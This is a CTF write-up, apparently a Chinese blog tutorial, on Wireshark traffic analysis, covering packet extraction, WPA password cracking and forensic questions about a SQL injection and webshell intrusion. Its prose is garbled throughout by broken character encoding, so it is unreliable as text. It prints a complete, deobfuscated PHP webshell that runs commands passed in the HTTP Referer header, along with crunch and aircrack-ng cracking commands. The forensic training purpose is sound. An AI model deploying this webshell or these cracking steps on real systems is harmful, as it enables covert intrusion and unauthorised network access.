è¾“çš„æ–‡ä»¶å†…å®¹**\næ–‡ä»¶->å¯¼å‡ºå¯¹è±¡->HTTP\n\n![](https://img.jwt1399.top//img/20201230113852.png)\n\nåœ¨æ‰“å¼€çš„å¯¹è±¡åˆ—è¡¨ä¸­æ‰¾åˆ°æœ‰ä»·å€¼çš„æ–‡ä»¶ï¼Œå¦‚å‹ç¼©æ–‡ä»¶ã€æ–‡æœ¬æ–‡ä»¶ã€éŸ³é¢‘æ–‡ä»¶ã€å›¾ç‰‡ç­‰ï¼Œç‚¹å‡»`Save`è¿›è¡Œä¿å­˜ï¼Œæˆ–è€…`Save All`ä¿å­˜æ‰€æœ‰å¯¹è±¡å†è¿›å…¥æ–‡ä»¶å¤¹è¿›è¡Œåˆ†æã€‚\n\n![](https://img.jwt1399.top//img/20201230114122.png)**æ‰‹åŠ¨æå–é€šè¿‡httpä¼ è¾“çš„æ–‡ä»¶å†…å®¹**\né€‰ä¸­httpæ–‡ä»¶ä¼ è¾“æµé‡åŒ…ï¼Œåœ¨åˆ†ç»„è¯¦æƒ…ä¸­æ‰¾åˆ°`data`,`Line-based text`, `JPEG File Interchange Format`, `data:text/html`å±‚ï¼Œé¼ æ ‡å³é”®ç‚¹å‡» â€“ é€‰ä¸­ å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµã€‚\n\n![](https://img.jwt1399.top//img/20201230114216.png)å¦‚æœæ˜¯èœåˆ€ä¸‹è½½æ–‡ä»¶çš„æµé‡ï¼Œéœ€è¦åˆ é™¤åˆ†ç»„å­—èŠ‚æµå‰å¼€å¤´å’Œç»“å°¾çš„X@Yå­—ç¬¦ï¼Œå¦åˆ™ä¸‹è½½çš„æ–‡ä»¶ä¼šå‡ºé”™ã€‚é¼ æ ‡å³é”®ç‚¹å‡» â€“ é€‰ä¸­ æ˜¾ç¤ºåˆ†ç»„å­—èŠ‚\n![](https://img.jwt1399.top//img/20201230114239.png)åœ¨å¼¹å‡ºçš„çª—å£ä¸­è®¾ç½®å¼€å§‹å’Œç»“æŸçš„å­—èŠ‚ï¼ˆåŸå­—èŠ‚æ•°å¼€å¤´åŠ 3ï¼Œç»“å°¾å‡3ï¼‰\n\n![](https://img.jwt1399.top//img/20201230114300.png)\n\næœ€åç‚¹å‡»`Save as`æŒ‰é’®å¯¼å‡ºã€‚\n\n## æµé‡åˆ†æç»å…¸é¢˜å‹\n\nCTFé¢˜å‹ä¸»è¦åˆ†ä¸ºæµé‡åŒ…ä¿®å¤ã€æ•°æ®æå–ã€WEBæµé‡åŒ…åˆ†æã€USBæµé‡åŒ…åˆ†æã€æ— çº¿å¯†ç ç ´è§£å’Œå·¥æ§æµé‡åŒ…åˆ†æç­‰ç­‰ã€‚\n### å…¥é—¨é¢˜å‹\n#### é¢˜ç›®ï¼šCephalopod(å›¾ç‰‡æå–)\né¢˜ç›®æ¥æºï¼šXCTF 3rd-HITB CTF-2017\nè€ƒç‚¹ï¼šå›¾ç‰‡æå–\né¢˜ç›®ä¿¡æ¯ï¼š(Cephalopod.pcapng)\n\n![](https://img.jwt1399.top//img/20201230114329.png)æ•°æ®åŒ…æ‰“å¼€ï¼Œåˆ†ç»„å­—èŠ‚æµæŸ¥è¯¢flagï¼Œå‘ç°å‡ºç°äº†flag.pngçš„å­—æ ·ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå¾€ä¸‹ç¿»ï¼Œå›¾ç‰‡åº”è¯¥åœ¨é•¿åº¦è¾ƒå¤§çš„æµä¸­ï¼Œè¿½è¸ªtcpæµåœ¨tcp.stream eq 2å¤„æ‰¾åˆ°å›¾ç‰‡æ–‡ä»¶ï¼Œä¿å­˜ä¸ºåŸå§‹æ•°æ®\n\n![](https://img.jwt1399.top//img/20201230114344.png)åˆ é™¤PNGå‰é¢å¤šä½™éƒ¨åˆ†ï¼Œä¿å­˜ä¸º1.png\n![](https://img.jwt1399.top//img/20201230114411.png)\n\nå¾—åˆ°flag\n![](https://img.jwt1399.top//img/20201230114431.png)\n\n#### é¢˜ç›®ï¼šç‰¹æ®Šåé—¨(icmpåè®®ä¿¡æ¯ä¼ è¾“)\né¢˜ç›®æ¥æºï¼šç¬¬ä¸ƒå±Šå±±ä¸œçœå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›\nè€ƒç‚¹ï¼šå­—ç¬¦ä¸²æœç´¢ï¼Œicmpåè®®ä¿¡æ¯ä¼ è¾“\né¢˜ç›®ä¿¡æ¯ï¼š(backdoor++.pcapng)\n\n![20190804062347863](https://img.jwt1399.top//img/20201230114448.png)æœç´¢flagå­—ç¬¦ä¸²ï¼Œåœ¨icmpä¸­å¾—åˆ°æç¤ºflagishere\n\n![](https://img.jwt1399.top//img/20201230114505.png)ä¹‹åçš„æ¯ä¸€ä¸ªicmpåŒ…éƒ½æœ‰å«ä¸€ä¸ªflagå­—ç¬¦\n\n![](https://img.jwt1399.top//img/20201230114526.png)\n\n![](https://img.jwt1399.top//img/20201230114537.png)\n![](https://img.jwt1399.top//img/20201230114551.png)\n\n![](https://img.jwt1399.top//img/20201230114605.png)\n\nä¾æ¬¡æŸ¥çœ‹æ‰€æœ‰icmpåŒ…æ‹¼å‡‘å­—ç¬¦å¾—åˆ°flag\n`flag{Icmp_backdoor_can_transfer-some_infomation}`\n\n#### é¢˜ç›®ï¼šæ‰‹æœºçƒ­ç‚¹(è“ç‰™ä¼ è¾“åè®®obex,æ•°æ®æå–)\né¢˜ç›®æ¥æºï¼šç¬¬ä¸ƒå­£æå®¢å¤§æŒ‘æˆ˜\nè€ƒç‚¹ï¼šè“ç‰™ä¼ è¾“åè®®obex,æ•°æ®æå–\né¢˜ç›®ä¿¡æ¯ï¼š(Blatand_1.pcapng)\n![](https://img.jwt1399.top//img/20201230114648.png)\næ ¹æ®é¢˜ç›®æç¤ºï¼Œæ‰‹æœºå…±äº«ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯è“ç‰™ä¼ è¾“ï¼Œè“ç‰™ä¼ è¾“åè®®ä¸º**OBEX**ï¼Œè¿‡æ»¤åå‘ç°å«æœ‰ä¸€ä¸ªå‹ç¼©åŒ…\n![](https://img.jwt1399.top//img/20201230114717.png)\n**æ–¹æ³•ä¸€**ï¼šforemoståˆ†ç¦»åå¾—åˆ°å‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°flag.gif\n![img](https://img.jwt1399.top//img/20201230114729.png)\n**æ–¹æ³•äºŒ**ï¼šé€‰ä¸­å«secret.raråŒ…ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œ\n![img](https://img.jwt1399.top//img/20201230114755.png)\nä¿å­˜ä¸º1.rarï¼Œè§£å‹åå¾—åˆ°flag.gif\n\n#### é¢˜ç›®ï¼šæƒ³è¹­ç½‘å…ˆè§£å¼€å¯†ç (æ— çº¿å¯†ç ç ´è§£)\né¢˜ç›®æ¥æºï¼šbugku\nè€ƒç‚¹ï¼šæ— çº¿å¯†ç ç ´è§£\né¢˜ç›®ä¿¡æ¯ï¼š(wifi.cap)\n![](https://img.jwt1399.top//img/20201230114817.png)\nä¸‹è½½capåŒ…ï¼ŒWIFIè¿æ¥è®¤è¯çš„é‡ç‚¹åœ¨WPAçš„å››æ¬¡æ¡æ‰‹åŒ…ï¼Œä¹Ÿå°±æ˜¯eapolåè®®çš„åŒ…ï¼Œè¿‡æ»¤ä¸€ä¸‹\n![](https://img.jwt1399.top//img/20201230114836.png)\næœç„¶å­˜åœ¨å››æ¬¡æ¡æ‰‹åŒ…ï¼Œç›´æ¥è¿›è¡Œæ— çº¿å¯†ç çˆ†ç ´\nåˆ›å»ºå¯†ç å­—å…¸ï¼š\n\n```\ncrunch 11 11 -t 1391040%%%% >> wifipass.txt\n```\n![](https://img.jwt1399.top//img/20201230114850.png)\n\n[Linuxä¸‹çš„å­—å…¸ç”Ÿæˆå·¥å…·Crunch](https://www.jianshu.com/p/a3401b0f3d9a)\nåˆ©ç”¨aircrack-ng è¿›è¡Œçˆ†ç ´\n\n```\naircrack-ng -w wifipass.txt wifi.cap\n```\n![](https://img.jwt1399.top//img/20201230114940.png)\nå¾—åˆ°flag\n`flag{13910407686}`\n\n### è¿›é˜¶é¢˜å‹\n\n#### é¢˜ç›®ï¼šæŠ“åˆ°ä¸€åªè‹è‡(æ•°æ®åŒ…ç­›é€‰,æ•°æ®æå–)\n\né¢˜ç›®æ¥æºï¼šbugku\nè€ƒç‚¹ï¼šæ•°æ®åŒ…ç­›é€‰,æ•°æ®æå–\né¢˜ç›®ä¿¡æ¯ï¼š(misc_fly.pcapng)\n![](https://img.jwt1399.top//img/20201230114957.png)\né¦–å…ˆæ‰“å¼€æ•°æ®åŒ…ï¼Œé¢˜ç›®æç¤ºäº†æŠ“åˆ°ä¸€åªè‹è‡ï¼Œè¯•ä¸€è¯•æœç´¢è‹è‡\n\n```php\nhttp contains \"è‹è‡\"\n```\nå‘ç°ä¸€äº›å¯ç–‘ä¿¡æ¯ï¼Œä»”ç»†åˆ†æä¸€ä¸‹å‘ç°æ˜¯åœ¨å‘qqé‚®ä»¶ï¼Œå¹¶ä¸”è¿˜ä¸Šä¼ äº†æ–‡ä»¶\n\n![](https://img.jwt1399.top//img/20201230115027.png)\næ—¢ç„¶ä¸Šä¼ äº†æ–‡ä»¶ï¼Œæˆ‘ä»¬å†è¿‡æ»¤POSTè¯·æ±‚è¯•è¯•:\n\n```html\nhttp.request.method==POST\n```\nå¯ä»¥çœ‹åˆ°13å·æ•°æ®åŒ…è°ƒç”¨å‡½æ•°`CreateFile`ï¼Œç„¶åä¸‹é¢å‡ ä¸ªå¯èƒ½å°±æ˜¯æ–‡ä»¶å†…å®¹äº†ï¼Œå…·ä½“æ˜¯å‡ ä¸ªï¼Œä»”ç»†çœ‹çœ‹URLï¼Œ738å·æ•°æ®åŒ…æœ‰ä¸ªéœ€è¦è°ƒç”¨å‡½æ•°`CheckFile`ï¼Œå¹¶ä¸”å‰é¢çš„5ä¸ªæ•°æ®åŒ…urlçš„è·¯å¾„ä¸€æ ·ï¼Œ\næ‰€ä»¥ä»ç¬¬ä¸€ä¸ªå¼€å§‹ï¼Œå5ä¸ªæ•°æ®åŒ…æ˜¯flag.rarå†…å®¹\n![](https://img.jwt1399.top//img/20201230115058.png)\næˆ‘ä»¬å°†åˆ†ç»„å­—èŠ‚æµä¸­çš„åŸå§‹æ•°æ®åˆ†åˆ«ä¿å­˜ä¸º1ã€2ã€3ã€4ã€5ï¼Œæ–¹ä¾¿æ“ä½œ\n![](https://img.jwt1399.top//img/20201230115114.png)\n![](https://img.jwt1399.top//img/20201230115126.png)\nä½†æ˜¯ç”±äºTCPåŒ…æœ‰æ–‡ä»¶å¤´ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰æ–‡ä»¶å¤´æ‰èƒ½å°†åŸå§‹æ•°æ®åˆæˆä¸€ä¸ªæ–‡ä»¶ï¼Œ\nä»ç¬¬ä¸€ä¸ªæ•°æ®åŒ…å¯ä»¥çœ‹å‡ºæ¥ï¼š\n\n![](https://img.jwt1399.top//img/20201230115138.png)\næ–‡ä»¶å¤§å°æ˜¯525701å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦çš„è¿™5ä¸ªæ•°æ®åŒ…çš„å¤§å°(Media Typeä¸­å¯çœ‹åˆ°):\n\n>131436*4+1777=527521\n527521-525701=1820\n1820/5=364\n\ntcpåŒ…çš„æ–‡ä»¶å¤´å°±ä¸º364\n\nç„¶åä½¿ç”¨linuxçš„ä¸€äº›å·¥å…·è¿›è¡Œæ“ä½œå³å¯å¾—åˆ°flag.rar\nä¾æ¬¡æŠŠäº”ä¸ªæ–‡ä»¶å»æ‰æ–‡ä»¶å¤´ä¿å­˜åˆ°å¦ä¸€æ–‡ä»¶\nè¿™é‡Œä½¿ç”¨ddï¼š\n```php\ndd if=1 bs=1 skip=364 of=1.1\n\nddå‘½ä»¤è¯­æ³•ï¼š\nif è¾“å…¥æ–‡ä»¶å\nbs è®¾ç½®æ¯æ¬¡è¯»å†™å—çš„å¤§å°ä¸º1å­—èŠ‚ \nskip æŒ‡å®šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡å¤šå°‘ä¸ªå—åå†å¼€å§‹å¤åˆ¶\nof è¾“å‡ºæ–‡ä»¶å\n```\n![](https://img.jwt1399.top//img/20201230115153.png)\nç„¶åå†ç”¨linuxçš„è¾“å…¥æµæ¥åˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶ï¼š\n\n```php\ncat 1.1 2.1 3.1 4.1 5.1 > fly.rar\næˆ–è€…\ncopy /B 1.1+2.1+3.1+4.1+5.1 fly.rar\n```\n![](https://img.jwt1399.top//img/20201230115208.png)\nç„¶åfly.raråˆè¢«ä¼ªåŠ å¯†äº†ï¼Œæ‰€ä»¥éœ€è¦å°†è¿™ä¸ªæ–‡ä»¶ç”¨HXDæ‰“å¼€åï¼Œå°†å…¶ä¸­çš„74 84æ”¹ä¸º74 80å°±èƒ½æ‰“å¼€äº†\n![](https://img.jwt1399.top//img/20201230115219.png)\nè§£å‹å¾—åˆ°flag.txtï¼Œç”¨HXDæ‰“å¼€ï¼Œæ˜¾ç¤ºåœ¨win32ä¸‹è¿è¡Œï¼Œ\n![](https://img.jwt1399.top//img/20201230115233.png)\nå› æ­¤æ”¹ä¸ºexeå¯æ‰§è¡Œæ–‡ä»¶åï¼Œä¸€å †è‹è‡å‡ºç°äº†ã€‚ã€‚ã€‚ã€‚\nbinwalkä¸€ä¸‹å‘ç°å«æœ‰å¾ˆå¤šå›¾ç‰‡,foremostæå–ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç \n![](https://img.jwt1399.top//img/20201230115246.png)\næ‰«ç å¾—åˆ°flag\n![](https://img.jwt1399.top//img/20201230115302.png)\n\n### æ•°æ®åˆ†æé¢˜\n> é¢˜ç›®ä¸€,äºŒ,ä¸‰,å››\n>é¢˜ç›®ç»™äº†10ä¸ªæµé‡åŒ…ï¼Œå…¶ä¸­åªæœ‰å››ä¸ªæµé‡åŒ…èƒ½å¤Ÿåˆ†æå‡ºæœ‰ç”¨ä¿¡æ¯\n>ä¸ºäº†æ–¹ä¾¿ï¼Œåˆ†ä¸ºé¢˜ç›®ä¸€äºŒä¸‰å››å¯¹å››ä¸ªæµé‡åŒ…è¿›è¡Œäº†åˆ†æ\n\né¢˜ç›®è¯¦æƒ…ï¼š\n![](https://img.jwt1399.top//img/20201230115317.jpg)\n\n#### é¢˜ç›®ä¸€(1.pcap)\n\né¢˜ç›®æ¥æºï¼š2018ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹æ•°æ®èµ›\n>é¢˜ç›®è¦æ±‚ï¼š\n1.é»‘å®¢æ”»å‡»çš„ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºçš„ç½‘å¡IPåœ°å€\n2.é»‘å®¢å¯¹URLçš„å“ªä¸€ä¸ªå‚æ•°å®æ–½äº†SQLæ³¨å…¥\n3.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„è¡¨å‰ç¼€ï¼ˆåŠ ä¸Šä¸‹åˆ’çº¿ä¾‹å¦‚abc_ï¼‰\n4.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„åå­—\n\næ‰“å¼€æµé‡åŒ…ï¼Œæµé‡åŒ…æœ‰ç‚¹å¤§ï¼Œæ‰“å¼€æ¯”è¾ƒæ…¢ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆè¿‡æ»¤ä¸ºHTTPåè®®å¯ä»¥çœ‹åˆ°`202.1.1.2`å¯¹`192.168.1.8`è¿›è¡Œäº†ç–¯ç‹‚çš„çˆ†ç ´\n![](https://img.jwt1399.top//img/20201230115337.png)\nä¸éš¾çœ‹å‡ºï¼Œé»‘å®¢åˆ©ç”¨çš„SqlMapåœ¨å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œä¸æ–­çš„SQLè¯•æ¢æ³¨å…¥\nå› æ­¤å—å®³ä¸»æœºçš„ç½‘å¡IPåœ°å€ä¸º**`192.168.1.8 `**\nè€Œæ³¨å…¥çš„å‚æ•°ä¹Ÿå¯ä»¥æ¸…æ™°çš„çœ‹è§ï¼Œä¸º**`list[select]`**\n![](https://img.jwt1399.top//img/20201230115349.png)\nè¿½è¸ªhttpæµï¼Œæ ¹æ®å›æ˜¾å†…å®¹ï¼Œç›®æ ‡ç«™ç‚¹æ•°æ®åº“æŠ›å‡ºçš„é”™è¯¯ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹è§\n![](https://img.jwt1399.top//img/20201230115404.png)\nä¸éš¾ç¡®å®šï¼Œç›®æ ‡ç«™ç‚¹çš„æ•°æ®åº“è¡¨åå‰ç¼€ä¸º**`ajtuc_`**\næ¥ç€ä¸ºäº†ç¡®å®šå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„åå­—ï¼Œå†è¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\næ­¤æ—¶æŒ‘é€‰æœ€åä¸€æ¬¡æ³¨å…¥çš„payloadè¿›è¡Œurlè§£ç \n![](https://img.jwt1399.top//img/20201230115419.png)\nå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°\n\n```sql\nFROM joomla.ajtuc_users\n```\nå› æ­¤æ•°æ®åº“åä¸º**`joomla`**\n\n##### ç­”æ¡ˆ\n\n```\n1.é»‘å®¢æ”»å‡»çš„ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºçš„ç½‘å¡IPåœ°å€ \n192.168.1.8\n2.é»‘å®¢å¯¹URLçš„å“ªä¸€ä¸ªå‚æ•°å®æ–½äº†SQLæ³¨å…¥\nlist[select]\n3.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„è¡¨å‰ç¼€(åŠ ä¸Šä¸‹åˆ’çº¿ä¾‹å¦‚abc_)\najtuc_\n4.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„åå­—\njoomla\n```\n#### é¢˜ç›®äºŒ(2.pcap)\né¢˜ç›®æ¥æºï¼š2018ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹æ•°æ®èµ›\n>é¢˜ç›®è¦æ±‚ï¼š\n1.é»‘å®¢ç¬¬ä¸€æ¬¡è·å¾—çš„phpæœ¨é©¬çš„å¯†ç æ˜¯ä»€ä¹ˆ\n2.é»‘å®¢ç¬¬äºŒæ¬¡ä¸Šä¼ phpæœ¨é©¬æ˜¯ä»€ä¹ˆæ—¶é—´\n3.ç¬¬äºŒæ¬¡ä¸Šä¼ çš„æœ¨é©¬é€šè¿‡HTTPåè®®ä¸­çš„å“ªä¸ªå¤´ä¼ é€’æ•°æ®\n\næ ¹æ®é¢˜ç›®ä¸€å·²ç¡®å®šç›®æ ‡ipï¼Œæ‰€ä»¥ä¾æ—§ä½¿ç”¨ä»¥ä¸‹è¿‡æ»¤ç®€åŒ–æ“ä½œ\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¥‡æ€ªæ–‡ä»¶`kkkaaa.php`,è·Ÿè¿›POSTæ•°æ®æŸ¥çœ‹\n![](https://img.jwt1399.top//img/20201230115437.png)\nä¸éš¾å‘ç°ï¼Œæ˜¯ä¸­å›½èœåˆ€çš„æµé‡,æœ¨é©¬å¯†ç ä¸º**`zzz`**\næ¥ç€ç¡®å®šé»‘å®¢ç¬¬äºŒæ¬¡ä¸Šä¼ phpæœ¨é©¬çš„æ—¶é—´\næˆ‘è¿›è¡Œäº†è¿‡æ»¤ï¼ŒçŒœæƒ³é»‘å®¢åº”è¯¥æ˜¯æ ¹æ®ç¬¬ä¸€ä¸ªæœ¨é©¬æ¥ä¸Šä¼ çš„ç¬¬äºŒä¸ªæœ¨é©¬\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST\n```\næ­¤æ—¶ä¸€æ¡æ•°æ®æ ¼å¤–å¼•äººæ³¨ç›®\n![](https://img.jwt1399.top//img/20201230115452.png)\næˆ‘ä»¬å¯¹å…¶16è¿›åˆ¶è¿›è¡Œåˆ†æ\n![](https://img.jwt1399.top//img/20201230115505.png)\nå°†ä¿å­˜çš„å€¼æ”¾å…¥HXDä¸­å¾—åˆ°æºç \n![](https://img.jwt1399.top//img/20201230115518.png)\nå°†æ–‡ä»¶ä¿å­˜ä¸ºphp,ä½†æ˜¯ä»£ç ç»è¿‡æ··æ·†è¿‡çš„ï¼Œåœ¨ä»£ç æœ«å°¾åŠ ä¸Šä¸‹é¢ä¸¤å¥ä»£ç \n\n```php\nvar_dump($j);\nvar_dump($x);\n```\nè¿è¡Œphpè¿›è¡Œè§£æ··æ·†ï¼Œå‘ç°è¿™å°±æ˜¯æœ¨é©¬\n![](https://img.jwt1399.top//img/20201230115533.png)\nç”±æ­¤å¯ç¡®å®šè¿™ä¸ªå¼•äººæ³¨ç›®çš„åŒ…ä¸Šä¼ äº†ç¬¬äºŒä¸ªæœ¨é©¬\nå› æ­¤ä¸Šä¼ æ—¶é—´ä¸º:`17:20:44.248365`\nç¾åŒ–å\n\n```php\n$kh = \"cb42\";\n$kf = \"e130\";\nfunction x($t, $k)\n{\n    $c = strlen($k);\n    $l = strlen($t);\n    $o = \"\";\n    for ($i = 0; $i < $l;) {\n        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {\n            $o .= $t{$i} ^ $k{$j};\n        }\n    }\n    return $o;\n}\n\n$r = $_SERVER;\n$rr = @$r[\"HTTP_REFERER\"];\n$ra = @$r[\"HTTP_ACCEPT_LANGUAGE\"];\nif ($rr && $ra) {\n    $u = parse_url($rr);\n    parse_str($u[\"query\"], $q);\n    $q = array_values($q);\n    preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\", $ra, $m);\n    if ($q && $m) {\n        @session_start();\n        $s =& $_SESSION;\n        $ss = \"substr\";\n        $sl = \"strtolower\";\n        $i = $m[1][0] . $m[1][4];\n        $h = $sl($ss(md5($i . $kh), 0, 3));\n        $f = $sl($ss(md5($i . $kf), 0, 3));\n        $p = \"\";\n        for ($z = 1; $z < count($m[1]); $z++) $p .= $q[$m[2][$z]];\n        if (strpos($p, $h) === 0) {\n            $s[$i] = \"\";\n            $p = $ss($p, 3);\n        }\n        if (array_key_exists($i, $s)) {\n            $s[$i] .= $p;\n            $e = strpos($s[$i], $f);\n            if ($e) {\n                $k = $kh . $kf;\n                ob_start();\n                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e))), $k)));\n                $o = ob_get_contents();\n                ob_end_clean();\n                $d = base64_encode(x(gzcompress($o), $k));\n                print(\"<$k>$d</$k>\");\n                @session_destroy();\n            }\n        }\n    }\n}\n```\nå®¹æ˜“çœ‹åˆ°æ­¤æ—¶æœ‰ä¸¤ä¸ªä¸HTTPå¤´æœ‰å…³çš„å‚æ•°\n```\n$rr = @$_SERVER[\"HTTP_REFERER\"];\n$ra = @$_SERVER[\"HTTP_ACCEPT_LANGUAGE\"];\n```\nè¿˜æ˜¯ä½¿ç”¨è¿‡æ»¤\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\nç„¶åå¯ä»¥çœ‹åˆ°è®¸å¤šè¯·æ±‚footer.phpçš„é¡µé¢ï¼Œç‚¹å¼€ä¸€ä¸ªæŸ¥çœ‹è¯¦æƒ…\n![](https://img.jwt1399.top//img/20201230115556.png)\nå®¹æ˜“å‘ç°refereræ•°æ®ååˆ†å¯ç–‘ï¼Œè€ŒACCEPT_LANGUAGEè¾ƒä¸ºæ­£å¸¸\næ‰€ä»¥å¯ä»¥åŸºæœ¬ç¡®å®šï¼Œæœ¨é©¬é€šè¿‡HTTPåè®®ä¸­çš„**`Referer`**å¤´ä¼ é€’æ•°æ®\n\n##### ç­”æ¡ˆ\n\n```\n1.é»‘å®¢ç¬¬ä¸€æ¬¡è·å¾—çš„phpæœ¨é©¬çš„å¯†ç æ˜¯ä»€ä¹ˆ\nzzz\n2.é»‘å®¢ç¬¬äºŒæ¬¡ä¸Šä¼ phpæœ¨é©¬æ˜¯ä»€ä¹ˆæ—¶é—´\n17:20:44.248365\n3.ç¬¬äºŒæ¬¡ä¸Šä¼ çš„æœ¨é©¬é€šè¿‡HTTPåè®®ä¸­çš„å“ªä¸ªå¤´ä¼ é€’æ•°æ®\nReferer\n```\n#### é¢˜ç›®ä¸‰(3.pcap)\né¢˜ç›®æ¥æºï¼š2018ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹æ•°æ®èµ›\n>é¢˜ç›®è¦æ±‚ï¼š\n1.å†…ç½‘ä¸»æœºçš„mysqlç”¨æˆ·åå’Œè¯·æ±‚è¿æ¥çš„å¯†ç hashæ˜¯å¤šå°‘(ç”¨æˆ·:å¯†ç hash)\n2.phpä»£ç†ç¬¬ä¸€æ¬¡è¢«ä½¿ç”¨æ—¶æœ€å…ˆè¿æ¥äº†å“ªä¸ªIPåœ°å€\n\nç›´æ¥è¿›è¡Œè¿‡æ»¤\n```\ntcp contains \"mysql\" && mysql\n```\nå¾—åˆ°å¤§é‡æ•°æ®ï¼Œå¯ä»¥å‘ç°é»‘å®¢åº”è¯¥åœ¨å¯¹Mysqlçš„ç™»å½•è¿›è¡Œçˆ†ç ´ï¼Œå†…ç½‘å—å®³æœºå™¨ä¸º192.168.2.20\n![](https://img.jwt1399.top//img/20201230115614.png)\næˆ‘ä»¬æ‰¾åˆ°æœ€åä¸€æ¡ç™»å½•æ•°æ®\n![](https://img.jwt1399.top//img/20201230115627.png)\nè¯¥å€¼å°±ä¸ºæˆ‘ä»¬éœ€è¦çš„mysqlå¯†ç hashäº†\nç®€å•è¿‡æ»¤ä¸€ä¸‹\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http\n```\n![](https://img.jwt1399.top//img/20201230115643.png)\nç›®æ ‡æœºå™¨å·²ç»è¢«æŒ‚ä¸Šäº†tunnel.phpï¼Œæ–¹ä¾¿å¤–ç½‘å¯¹å†…ç½‘çš„è®¿é—®\nä¸ºæ–¹ä¾¿æŸ¥çœ‹é»‘å®¢æ“ä½œï¼Œæˆ‘ä»¬è¿‡æ»¤å‡ºPOSTè¯·æ±‚\n\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && http.request.method==POST && http\n```\n![](https://img.jwt1399.top//img/20201230115656.png)\næˆ‘ä»¬æ¸…æ™°çš„çœ‹è§é»‘å®¢çš„phpä»£ç†ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æœ€å…ˆè¿æ¥4.2.2.2è¿™ä¸ªip\n\n##### ç­”æ¡ˆ\n```\n1.å†…ç½‘ä¸»æœºçš„mysqlç”¨æˆ·åå’Œè¯·æ±‚è¿æ¥çš„å¯†ç hashæ˜¯å¤šå°‘(ç”¨æˆ·:å¯†ç hash)\nadmin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4\n2.phpä»£ç†ç¬¬ä¸€æ¬¡è¢«ä½¿ç”¨æ—¶æœ€å…ˆè¿æ¥äº†å“ªä¸ªIPåœ°å€\n4.2.2.2\n```\n#### é¢˜ç›®å››(4.pcap)\né¢˜ç›®æ¥æºï¼š2018ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹æ•°æ®èµ›\n>é¢˜ç›®è¦æ±‚ï¼š\n1.é»‘å®¢ç¬¬ä¸€æ¬¡è·å–åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨çš„æ¼æ´åˆ©ç”¨è¯·æ±‚å‘ç”Ÿåœ¨ä»€ä¹ˆæ—¶å€™\n2.é»‘å®¢åœ¨å†…ç½‘ä¸»æœºä¸­æ·»åŠ çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¤šå°‘\n3.é»‘å®¢ä»å†…ç½‘æœåŠ¡å™¨ä¸­ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å\n\nä¸ºç¡®å®šé»‘å®¢ç¬¬ä¸€æ¬¡è·å–åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨çš„æ¼æ´åˆ©ç”¨è¯·æ±‚å‘ç”Ÿåœ¨ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬ç»§ç»­è¿›è¡Œè¿‡æ»¤\n```\n(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) && (http contains \"dir\" || http contains \"ls\")\n```\n![](https://img.jwt1399.top//img/20201230115712.png)\næ­¤æ—¶ä¸€æ¡ä¸ºlsï¼Œä¸€æ¡ä¸ºdirï¼Œæˆ‘ä»¬å…ˆå¯¹lsçš„è¿›è¡ŒéªŒè¯\nè¿½è¸ªå…¶tcpæµ\n![](https://img.jwt1399.top//img/20201230115738.png)\nå‘ç°å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸ,å†å¯¹dirè¿›è¡ŒéªŒè¯\n![](https://img.jwt1399.top//img/20201230115752.png)\näºæ˜¯å¯ä»¥ç¡®å®šæ— è¯¯ï¼Œç›®æ 